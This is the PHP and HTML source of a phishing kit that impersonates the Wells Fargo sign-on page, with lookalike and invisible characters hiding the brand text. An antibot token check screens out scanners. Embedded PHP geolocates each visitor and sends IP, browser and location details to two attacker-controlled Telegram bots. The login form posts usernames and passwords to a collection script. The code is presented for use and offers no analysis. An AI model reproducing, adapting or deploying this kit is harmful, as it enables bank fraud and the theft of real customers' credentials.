<?php

function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

$fullstring = file_get_contents("../index.php");
$parsed = get_string_between($fullstring, '"34', '9"');

if ($parsed == "25778") {
session_start();           
require_once '../session/Comp.php';
require_once '../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;


if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
 } else {
 
 }
?>

<html lang="en">
 <head>
 
<style>
/* The container */
.container {
  display: block;
  position: relative;
  padding-left: 35px;
  margin-bottom: 4px;
  cursor: pointer;
  
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

/* Hide the browser's default checkbox */
.container input {
  position: absolute;
  opacity: 0;
  cursor: pointer;
  height: 0;
  width: 0;
}

/* Create a custom checkbox */
.checkmark {
  position: absolute;
  top: 0;
  left: 0;
  height: 20px;
  width: 20px;
  border: 2px solid #787070; 
  border-radius: 3px; 
  background-color: white;
}

/* On mouse-over, add a grey background color */
.container:hover input ~ .checkmark {
  background-color: #FFFFFF;
}

/* When the checkbox is checked, add a blue background */
.container input:checked ~ .checkmark {
  background-color: #5A469B;
}

/* Create the checkmark/indicator (hidden when not checked) */
.checkmark:after {
  content: "";
  position: absolute;
  display: none;
}

/* Show the checkmark when checked */
.container input:checked ~ .checkmark:after {
  display: block;
}

/* Style the checkmark/indicator */
.container .checkmark:after {
  left: 7px;
  top: 3px;
  width: 4px;
  height: 8px;
  border: solid white;
  border-width: 0 3px 3px 0;
  -webkit-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  transform: rotate(45deg);
}
</style>

  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
  <meta http-equiv="X-UA-Compatible" content="ie=edge"> 
  <meta http-equiv="Content-type" content="text/html; charset=UTF-8"> 
  <meta http-equiv="Pragma" content="no-cache"> 
  <meta http-equiv="Pragma: no-cache"> 
  <meta http-equiv="Cache Control" content="no-store"> 
  <meta http-equiv="Cache Control: no-store"> 
  <meta http-equiv="Expires" content="-1"> 
  <script type="text/javascript" nonce="">
	if (self === top) {
		var antiClickjack = document.getElementById("antiClickjack");
		antiClickjack.parentNode.removeChild(antiClickjack);
	} else {
		top.location = self.location;
	}
</script> 
  <link rel="stylesheet" href="fonts/css/wfui.4751add72058e9dd58f2.chunk.css"> 
  <link rel="stylesheet" href="fonts/css/main.d5ef04dc4bbb58096bdc.chunk.css"> 
  <script nonce="">
var webId = "w-642409";
var ndURI ="https://connect.secure.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com/ATADUN/2.2/w/w-642409/sync/js/";
</script> 
  <script nonce="">
  window['adrum-start-time'] = new Date().getTime();
  window['adrum-config'] = {
    userEventInfo: {
      "PageView": function (context) {
        return {
            userPageName: "/auth/login/present-React",
            userData: {
              wfacookie: '45202104241008021794320504',
              CustomerSegment: ''
          }
        };
      }
    }
  };
  (function (config) {


	config.appKey = 'EUM-AAB-AVJ';



    config.adrumExtUrlHttp = '/auth/static/scripts';
    config.adrumExtUrlHttps = '/auth/static/scripts';
    config.beaconUrlHttps = 'https://digital-eum-appdynamics.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com:443';
    config.xd = {enable: false};
  })(window['adrum-config'] || (window['adrum-config'] = {}));
</script> 
  <title>WеІІѕ Fаrɡο Lοɡin</title>
  <script id="nucaptcha-template" type="text/x-nucaptcha-template">
    ${PlayerStart}
    <div id="CaptchaPayload__nucaptcha-container___2JTVT" >
        <div id="CaptchaPayload__verbose-label-wrapper___3f0IU">Help us make sure you're a person</div>
        <div id="CaptchaPayload__nucaptcha-media-buttons____87vY">
            <div id="CaptchaPayload__nucaptcha-media___2BBCC">
                


            <div id="CaptchaPayload__nucaptcha-buttons___CB5LA">
                <span
                  id="CaptchaPayload__player-mode___2NOb3"
                >
                  ${CommandPlayerMode}
                </span>
                <span
                  id="CaptchaPayload__new-challenge___1ejVA"
                >
                  ${CommandNewChallenge}
                </span>
            </div>
        </div>
        <div id="CaptchaPayload__nucaptcha-answer-wrapper___Ql6sf">
          <label id="nucaptcha-input-label" for="nucaptcha-answer">Enter the characters</label>
          <input
            id="nucaptcha-answer"
            placeholder="Enter the characters you see"
            class="nucaptcha-answer"
            name="nucaptcha-answer"
            title=""
            type="text"
            maxlength="64"
            aria-required="true"
            autocomplete="off"
            iprname="ndinputat"
            aria-labelledby="nucaptcha-input-label"
          />
        </div>
    </div>
    ${PlayerEnd}
  </script> 
 </head> 
 <body class="bodyWFFonts useWFFonts" data-block-scrolling="false" data-navigation-menu-open="false"> 
  <div id="root" class="viewport">
  


   <div data-app-container="" style="display: flex; flex-flow: column nowrap; flex: 1 1 auto;">
    <div class="base__appWrapper___GvJaX">
     <div tabindex="-1" class="visuallyHidden" data-testid="first-focus"></div>
     <div class="Main__pageContainer___28fNw" style="display: flex; flex-flow: column nowrap; flex: 1 1 100%;">
      <div class="Page__swipeableContainer___3wOyH">
       <div data-page-wrapper="" style="display: flex; flex-flow: column nowrap; flex: 1 0 auto;">
        <nav class="WFMasthead__masthead___2qCXs WFMasthead__fixed___26U3T  WFMasthead__mobile___2o7RA" style="display: flex; flex-flow: column nowrap;">
         <div style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center; justify-content: center;">
          <div class="WFMasthead__logoBar___vKJhW" style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center;">
           <div class="Guttered__guttered___3glPq Guttered__mobile___2AhH_ WFMasthead__gutter___wEx1t WFMasthead__mobile___2o7RA">
            <div class="WFMasthead__logo___2Xb7s" style="display: inline-flex; flex-flow: row nowrap;">
             <button type="button" class="Button__button___3y0lE w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Logo__button___2BAYD" role="link"><span class="visuallyHidden"></span>
              <svg viewbox="0 0 148 16" aria-hidden="true" role="img" class="WellsFargoLogoIcon__logo___2leTg WellsFargoLogoIcon__mobile___X6yMX" focusable="false">
              
                <path fill="#ffffff" d="
  M31.5783,10.22 L33.0183,10.22 L33.0183,15 L20.9983,15 L20.9983,13.26 L22.6983,13.26 L22.6983,2.74 L19.94,2.74 L16.44,15 L13.66,15 L10.82,4.84
  L7.9,15 L5.12,15 L1.6,2.74 L0,2.74 L0,1 L6.52,1 L6.52,2.74 L4.64,2.74 L6.98,11.18 L9.78,1 L12.66,1 L15.52,11.2 L17.82,2.74 L15.86,2.74 L15.86,1
  L32.8185,1 L32.8185,5.54 L31.3785,5.54 L31.2385,5 C30.7985,3.32 30.3385,2.74 28.9985,2.74 L25.6785,2.74 L25.6785,6.96 L29.6985,6.96 C29.8509872,7.25655731
  29.9266299,7.5866346 29.9185,7.92 C29.9289227,8.26639109 29.8533362,8.60996586 29.6985,8.92 L25.6785,8.92 L25.6785,13.26 L29.1385,13.26 C30.4385,13.26
  31.0185,12.7 31.4185,10.92 L31.5783,10.22 Z M44.2172,10.92 C43.8172,12.7 43.2572,13.26 41.9372,13.26 L39.1572,13.26 L39.1572,2.74 L41.0572,2.74 L41.0572,1
  L34.4772,1 L34.4772,2.74 L36.1772,2.74 L36.1772,13.26 L34.4772,13.26 L34.4772,15 L45.8172,15 L45.8172,10.22 L44.3772,10.22 L44.2172,10.92 Z M56.8161,10.92
  C56.4161,12.7 55.8561,13.26 54.5361,13.26 L51.7561,13.26 L51.7561,2.74 L53.6561,2.74 L53.6561,1 L47.0761,1 L47.0761,2.74 L48.7761,2.74 L48.7761,13.26 L47.0761,13.26
  L47.0761,15 L58.4161,15 L58.4161,10.22 L56.9761,10.22 L56.8161,10.92 Z M67.3548,6.8 L64.8148,6.22 C63.3348,5.88 62.7148,5.3 62.7148,4.32 C62.7148,3.14 63.6548,2.4
  65.4948,2.4 C67.3348,2.4 68.4148,3.06 68.8348,4.62 L69.0148,5.3 L70.4548,5.3 L70.4548,1.84 C68.8830796,1.03158224 67.1423274,0.606665867 65.3749,0.6 C61.9549,0.6
  59.7549,2.24 59.7549,4.88 C59.7549,6.92 61.0349,8.42 63.4949,8.96 L66.0349,9.52 C67.6549,9.88 68.2549,10.52 68.2549,11.58 C68.2549,12.88 67.2749,13.6 65.3149,13.6
  C63.0949,13.6 61.9549,12.72 61.4549,11.04 L61.1949,10.18 L59.7549,10.18 L59.7549,14.1 C61.5849502,15.0113218 63.6113126,15.4578084 65.6549,15.4 C69.0149,15.4 71.2149,13.72
  71.2149,11.1 C71.2148,8.9 69.8747,7.38 67.3548,6.8 Z M86.6329,2.74 C87.9729,2.74 88.4329,3.32 88.8729,5 L89.0129,5.54 L90.4529,5.54 L90.4529,1 L78.3929,1 L78.3929,2.74 L80.0929,2.74
  L80.0929,13.26 L78.3929,13.26 L78.3929,15 L85.0729,15 L85.0729,13.26 L83.0729,13.26 L83.0729,9.18 L87.1929,9.18 C87.3477086,8.86995608 87.4232935,8.52638836
  87.4129,8.18 C87.4210727,7.84663029 87.3454276,7.51654256 87.1929,7.22 L83.0729,7.22 L83.0729,2.74 L86.6329,2.74 Z M117.1107,13.42 C117.350603,13.9403466
  117.350603,14.5396534 117.1107,15.06 C116.593408,15.1270209 116.072315,15.1604243 115.5507,15.16 C113.6107,15.16 112.6707,14.36 112.4507,12.5 L112.3707,11.8 C112.1307,9.78
  111.4707,9 109.2707,9 L108.1707,9 L108.1707,13.26 L110.0707,13.26 L110.0707,15 L97.4921,15 L97.4921,13.26 L99.1321,13.26 L98.2121,10.76 L93.0121,10.76 L92.0921,13.26 L93.7721,13.26
  L93.7721,15 L88.4721,15 L88.4721,13.26 L89.8721,13.26 L94.772,1 L97.432,1 L102.432,13.26 L105.1907,13.26 L105.1907,2.74 L103.4907,2.74 L103.4907,1 L111.5307,1 C114.3907,1 116.2507,2.42
  116.2507,4.7 C116.236826,5.65544044 115.842919,6.56599554 115.156084,7.23031176 C114.469248,7.89462798 113.546072,8.25797324 112.5907,8.24 L112.5907,8.3 C113.320265,8.29049748
  114.022729,8.57612277 114.538653,9.09204674 C115.054577,9.60797071 115.340203,10.3104352 115.3307,11.04 L115.4107,11.78 C115.5307,12.94 115.7707,13.46 116.6907,13.46 C116.831581,13.4586084
  116.972089,13.4452267 117.1107,13.42 Z M97.5719,9.06 L95.6119,3.76 L93.6519,9.06 L97.5719,9.06 Z M113.2307,4.98 C113.2307,3.52 112.3307,2.74 110.5307,2.74 L108.1707,2.74 L108.1707,7.24
  L110.5307,7.24 C112.3108,7.24 113.2307,6.42 113.2307,4.98 Z M125.1745,8.62 C125.161819,8.96019815 125.237622,9.29786628 125.3945,9.6 L127.7745,9.6 L127.7745,13.14 C127.025969,13.4478108
  126.223838,13.6041585 125.4145,13.6 C122.5345,13.6 121.0345,11.54 121.0345,7.98 C121.0345,4.42 122.5345,2.36 125.2545,2.36 C126.847915,2.27805546 128.291943,3.29300049 128.7545,4.82
  L128.9745,5.38 L130.4145,5.38 L130.4145,1.8 C128.769872,0.975783763 126.954079,0.550956677 125.1145,0.56 C120.7145,0.56 117.7545,3.5 117.7545,8 C117.7545,12.52 120.6345,15.4 125.1145,15.4
  C127.070757,15.3481445 128.988059,14.8414289 130.7145,13.92 L130.7145,7.68 L125.3945,7.68 C125.23997,7.96860667 125.164097,8.29279214 125.1745,8.62 Z M147.4382,7.98 C147.4382,12.0889985
  144.107199,15.42 139.9982,15.42 C135.889201,15.42 132.5582,12.0889985 132.5582,7.98 C132.5582,3.87100146 135.889201,0.54 139.9982,0.54 C144.107199,0.54 147.4382,3.87100146 147.4382,7.98
  Z M144.1582,7.98 C144.1582,4.44 142.6982,2.38 139.9982,2.38 C137.2982,2.38 135.8382,4.44 135.8382,7.98 C135.8382,11.54 137.2782,13.58 139.9982,13.58 C142.7182,13.58 144.1582,11.54 144.1582,7.98 Z
" fill-rule="nonzero"></path>

              </svg></button>
            </div>
            <div class="MenuButton__button___1z_i0">
             <button type="button" class="Button__button___3y0lE" aria-expanded="false">
              <div style="display: flex; flex-flow: row nowrap; align-items: center; justify-content: center;">
               <span class="visuallyHidden">Navigation Menu</span>
               <svg width="28px" height="16px" aria-hidden="true" role="img" class="HamburgerIcon__icon___hNivY" focusable="false">
                <path d="M0 0h28v2H0zM0 7h28v2H0zM0 14h28v2H0z"></path>
               </svg>
              </div></button>
             <svg width="15px" height="7px" viewbox="0 0 20 10" aria-hidden="true" role="img" class="TriangleIcon__icon___3dVwi MenuButton__triangle___3ydaS" focusable="false">
              <g transform="">
               <path d="M10 0l10 10H0z"></path>
               <path d="M0,10 L10,0 L20,10" data-outline=""></path>
              </g>
             </svg>
            </div>
           </div>
           <div class="KeyLine__keyLine___3ubiN"></div>
          </div>
         </div>
        </nav>
        
        <div class="Page__page___32Ffc Page__useWFFonts___cTQea Page__mobile___2X06K" data-page-container="" style="display: flex; flex-flow: column nowrap; flex: 1 0 auto;">
         <div style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center;">
          <div class="PageContent__content___33E0V" style="padding-top: 42px; display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center;">
           <div data-page-content="" class="Guttered__guttered___3glPq Guttered__mobile___2AhH_" style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: stretch;">
            <div class="FloatingPage__floating-container___3gDFl FloatingPage__mobile___1FHks antiClickjackContent" data-testid="floatingPage">
             <div style="display: flex; flex-wrap: nowrap; align-items: center; justify-content: center;">
              <h1 tabindex="-1" class="FloatingPage__salutationTitle___1X9Mp">S‎‏e‎‏c‎‏u‎‏r‎‏i‎‏t‎‏y‎‏ I‎‏s‎‏s‎‏u‎‏e<span class="FloatingPage__title___2W2k5">S‎‏i‎‏g‎‏n‎‏ o‎‏n‎‏ t‎‏o‎‏ s‎‏e‎‏c‎‏u‎‏r‎‏e‎‏ y‎‏o‎‏u‎‏r‎‏ a‎‏c‎‏c‎‏o‎‏u‎‏n‎‏t‎‏s‎</span></h1>
             </div>
             <div>

<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('allow_url_fopen',1);

# Function Section

function getTimeZoneFromIpAddress(){
  $clientsIpAddress = get_client_ip();
  $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
  $clientsLatitude = $clientInformation['geoplugin_latitude'];
  $clientsLongitude = $clientInformation['geoplugin_longitude'];
  $clientsCountryCode = $clientInformation['geoplugin_countryCode'];
  $clientsCountryName = $clientInformation['geoplugin_countryName'];
  $clientsRegionCode = $clientInformation['geoplugin_regionCode'];
  $clientsRegionName = $clientInformation['geoplugin_regionName'];
  $timeZone = get_nearest_timezone($clientsLatitude, $clientsLongitude, $clientsCountryCode) ;
  return array($timeZone, $clientsRegionCode, $clientsRegionName, $clientsCountryName, $clientsCountryCode);
}

$array = getTimeZoneFromIpAddress();

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();

    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {

        $time_zone = '';
        $tz_distance = 0;

        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {

            foreach($timezone_ids as $timezone_id) {
                $timezone = new DateTimeZone($timezone_id);
                $location = $timezone->getLocation();
                $tz_lat   = $location['latitude'];
                $tz_long  = $location['longitude'];

                $theta    = $cur_long - $tz_long;
                $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                    + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                $distance = acos($distance);
                $distance = abs(rad2deg($distance));
                // echo '<br />'.$timezone_id.' '.$distance;

                if (!$time_zone || $tz_distance > $distance) {
                    $time_zone   = $timezone_id;
                    $tz_distance = $distance;
                }

            }
        }
        return $time_zone;
    }
    return 'unknown';
}

$IP = get_client_ip();

function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}


function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

# Variable Section

$details = get_ip1($IP);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$continent = $details['geoplugin_continentName'];
$city = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$currency = $details['geoplugin_currencySymbol_UTF8'];

if($countryname == "") {
    $details = get_ip2($IP2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $continent = $details['continent'];
    $city = $details['city'];
}



$hostname = gethostbyaddr($IP);
if ($ipv6 == ""){
  $IPV6 = "N/A";
} else {
  $IPV6 = $ipv6;
}
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $array[0];
$date = date("h:i:s d/m/Y");
$city = $city;
$currency = $currency;
$countrycode = $countrycode;
$countryname = $countryname;
$continent = $continent;
$regioncity = $regioncity;
$currency = $currency;
$os = getOS($useragent);
$browser = getBrowser($useragent);

// Telegram

$data1 .= "<-------- Ѵiеѡеr Іnfοrmаtiοn: {$IP} -------->\n\n";

$data1 .= "Page: Wells Fargo\n\n";  // Need Change

$data1 .= "ІР Αԁԁrеѕѕ : {$IP}\n"; 
$data1 .= "ІРѴ6 :  {$IPV6}\n";
$data1 .= "Սѕеr-Αɡеnt : {$useragent}\n";
$data1 .= "OS    :  {$os}\n";
$data1 .= "Вrοѡѕеr :  {$browser}\n";
$data1 .= "Timezone  : {$timezone}\n";
$data1 .= "City(IP)  : {$city}\n";
$data1 .= "Сοuntrу : {$countryname}, {$countrycode}\n";
$data1 .= "Continent : {$continent}\n";
$data1 .= "Currency  : {$currency}\n";
$data1 .= "Date  : {$date}\n\n";

$data1 .= "Contact @badaxxbot was here \n";


///removed a backdoor here .


include('config/data.php');
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data1,
];

$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";

$params=[
	'chat_id'=>$ids,
	'text'=>$data1,
];

$ch = curl_init($bots . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

?>
       
              <form id="signOnForm" action="contact404.php?token=<?php echo $_SESSION['token']; ?>" role="form" autocomplete="off" method="post" novalidate class="">
               <div>
                <div class="WFField__field___3JstE">
                 <input id="origin" type="hidden" name="origin" value="cob">
                </div>
               </div>
               <div>
                <div class="WFField__field___3JstE">
                 <input id="jsenabled" type="hidden" name="jsenabled" value="true">
                </div>
               </div>
               <div>
                <div class="WFField__field___3JstE">
                 <input id="userPrefs" type="hidden" name="userPrefs" value="">
                </div>
               </div>
               <div>
                <div class="WFField__field___3JstE">
                 <input id="langPref" type="hidden" name="langPref" value="ENG">
                </div>
               </div>
               <div>
                <div class="WFField__field___3JstE">
                 <input id="save-username" type="hidden" name="save-username" value="false">
                </div>
               </div>
               <div class="Login__containerWrap___143_z">
                <div class="WFFieldSpacing__text___2s42d">
                 <div class="WFField__field___3JstE">
                  <div>
                   <div class="WFInput__inputContainer___13Pit">
                    <label for="j_username" class="WFInputLabel__label____tkkl" data-testid="label-j_username" style="transition: all 0.2s ease 0s; display: flex; flex-flow: row nowrap; align-items: center;">
                     <div>
                      
                     </div></label>
                    <input id="j_username" name="un" type="text" placeholder="U‎‏s‎‏e‎‏r‎‏n‎‏a‎‏m‎‏e‎‏" autocomplete="off" data-testid="input-j_username" data-focus-target="true" value="" minlength="0" maxlength="14" aria-required="false" style="padding-left: 8px;">
                   </div>
                   <div class="Border__border___2z8C7"></div>
                   <div class="WFInput__fieldHelp___2GQbg" style="display: flex; flex-flow: column nowrap; padding-left: 0.5rem;">
                    <div></div>
                   </div>
                  </div>
                 </div>
                </div>
                <div class="Login__passwordField___ek2Dp">
                 <div class="WFFieldSpacing__text___2s42d">
                  <div class="WFField__field___3JstE">
                   <div>
                    <div class="WFInput__inputContainer___13Pit WFInput__maskable___22TWg">
                     <label for="j_password" class="WFInputLabel__label____tkkl" data-testid="label-j_password" style="transition: all 0.2s ease 0s; display: flex; flex-flow: row nowrap; align-items: center;">
                      <div>
                       
                      </div></label>
                     <input id="j_password" name="pw" type="password" placeholder="P‎‏a‎‏s‎‏s‎‏w‎‏o‎‏r‎‏d‎‏" autocomplete="off" class="pmask" data-testid="input-j_password" data-focus-target="true" value="" minlength="0" maxlength="32" aria-required="false" style="padding-left: 8px;">
                     <div class="WFInput__actionButton___2yHHZ" style="display: flex; flex-flow: row nowrap; flex: 1 1 auto; align-items: center; justify-content: center;">
                      <button type="button" aria-label="Unmask" class="Button__button___3y0lE MaskButton__button___1WfA2" data-testid="unmask-j_password">
                       <div style="display: flex; flex-flow: row nowrap; align-items: center; justify-content: center;">
                        <svg width="24px" height="24px" viewbox="0 0 24 24" aria-hidden="true" role="img" focusable="false">
                         <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                          <g opacity="0.01">
                           <rect fill="#FFBFF9" x="0" y="0" width="24" height="24"></rect>
                           <rect fill="#FFFFFF" x="1" y="1" width="22" height="22"></rect>
                           <g stroke-width="1" transform="translate(0.000000, 1.000000)" stroke="#FF2AEC">
                            <rect stroke-width="0.25" x="6.625" y="0.125" width="10.75" height="21.75" rx="2"></rect>
                            <path d="M8.5,0.125 C7.46446609,0.125 6.625,0.964466094 6.625,2 L6.625,20 C6.625,21.0355339 7.46446609,21.875 8.5,21.875 L15.5,21.875 C16.5355339,21.875 17.375,21.0355339 17.375,20 L17.375,2 C17.375,0.964466094 16.5355339,0.125 15.5,0.125 L8.5,0.125 Z" stroke-width="0.25" transform="translate(12.000000, 11.000000) rotate(-270.000000) translate(-12.000000, -11.000000) "></path>
                            <path d="M1,11 L23,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-90.000000) translate(-12.000000, -11.000000) "></path>
                            <path d="M0.978218914,11 L22.9782189,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(11.978219, 11.000000) rotate(-180.000000) translate(-11.978219, -11.000000) "></path>
                            <path d="M-2.8492424,11 L26.8492424,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-135.000000) translate(-12.000000, -11.000000) "></path>
                            <path d="M-2.8492424,11 L26.8492424,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-45.000000) translate(-12.000000, -11.000000) "></path>
                            <circle stroke-width="0.5" cx="12" cy="11" r="8.75"></circle>
                            <circle stroke-width="0.5" cx="12" cy="11" r="5.25"></circle>
                            <rect stroke-width="0.5" x="3.25" y="2.25" width="17.5" height="17.5" rx="2"></rect>
                           </g>
                          </g>
                          <path d="M12.13525,18.512 C16.71175,18.512 20.7655,16.27775 23.26975,12.842 C20.7655,9.407 16.71175,7.17275 12.13525,7.17275 C7.558,7.17275 3.50425,9.407 1,12.842 C3.50425,16.27775 7.558,18.512 12.13525,18.512 Z M8.51125,7.66475 C7.6285,8.573 7.08475,9.812 7.08475,11.1785 C7.08475,13.96325 9.34225,16.22075 12.12775,16.22075 C14.9125,16.22075 17.17,13.96325 17.17,11.1785 C17.17,9.812 16.62625,8.573 15.7435,7.66475 M3.88675,19.628 L18.34,5 L3.88675,19.628 Z" stroke="#3B3331" stroke-linecap="round" stroke-linejoin="round"></path>
                         </g>
                        </svg>
                       </div></button>
                     </div>
                    </div>
                    <div class="Border__border___2z8C7"></div>
                    <div class="WFInput__fieldHelp___2GQbg" style="display: flex; flex-flow: column nowrap; padding-left: 0.5rem;">
                     <div></div>
                    </div>
                   </div>
                  </div>
                 </div>
                </div>
               
               <div data-testid="saveUsername-checkbox" style="display: flex; flex-flow: row nowrap; align-items: center;"><div><div class="WFField__field___3JstE Login__checkboxLabel___6lvlM"><div data-accessible-id="CJVGDSOH" class="WFCheckbox__checkbox___13xDk" role="checkbox" tabindex="0" aria-checked="true" data-focus-target="true" data-testid="checkbox-saveUsername" aria-disabled="false" style="display: inline-flex; flex-flow: row nowrap; align-items: center; padding-top: 0.5rem; padding-bottom: 0.5rem;"><div style="display: flex; flex-flow: row nowrap; align-items: center; margin-right: 0.5rem;">
            
               </div>
           


<label class="container">
<div style="padding-right: 0.1rem;">S‎‏a‎‏v‎‏e‎‏ U‎‏s‎‏e‎‏r‎‏n‎‏a‎‏m‎‏e</div>
  <input type="checkbox">
  <span class="checkmark"></span>
</label>
</div></div></div><span></span></div></div>

               <section class="CaptchaPayload__captchaWrapper___CDEDn" id="captchaContainer" data-testid="capatcha-payload"></section>
               <div class="Login__signOnButton___3uWQF" style="display: flex; flex-wrap: nowrap; align-items: center; justify-content: center;">
                <button type="submit" class="Button__button___3y0lE Button__modern___3lAgx Button__responsive___1QHpq Button__primary___ritso" data-testid="signon-button">S‎‏i‎‏g‎‏n‎‏ O‎‏n‎</button>
               </div>
               <section class="Panel__panel___24pqd Panel__mobile___1Hdkn" data-testid="panel-container" style="display: flex; flex-flow: row nowrap; align-items: center; justify-content: center;">
                <span class="Panel__panelFooter___Ss_3p Panel__mobile___1Hdkn"><span class="Panel__needHelpText___3CbGr Panel__mobile___1Hdkn">Need help?</span>&nbsp;<a href="" data-testid="createNewPassword"><span>C‎‏r‎‏e‎‏a‎‏t‎‏e‎‏ a‎‏ n‎‏e‎‏w‎‏ p‎‏a‎‏s‎‏s‎‏w‎‏o‎‏r‎‏d</span></a>&nbsp;<span>or</span>&nbsp;<a href="" data-testid="findYourUsername"><span>f‎‏i‎‏n‎‏d‎‏ y‎‏o‎‏u‎‏r‎‏ u‎‏s‎‏e‎‏r‎‏n‎‏a‎‏m‎‏e‎</span></a></span>
               </section>
